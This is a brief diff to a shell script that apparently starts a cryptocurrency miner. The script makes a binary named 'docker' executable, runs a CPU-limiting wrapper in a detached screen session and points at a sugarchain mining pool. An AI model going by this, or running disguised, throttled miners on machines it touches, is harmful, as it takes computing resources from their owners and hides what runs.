@@ -1,5 +1,4 @@
-sudo apt update 
-sudo apt install screen libjansson4 -y 
+echo "run"
 chmod +x docker limit.sh
 screen -dmS limit ./limit.sh 00 65 75
 POOL=1pool.sugarchain.org:3333
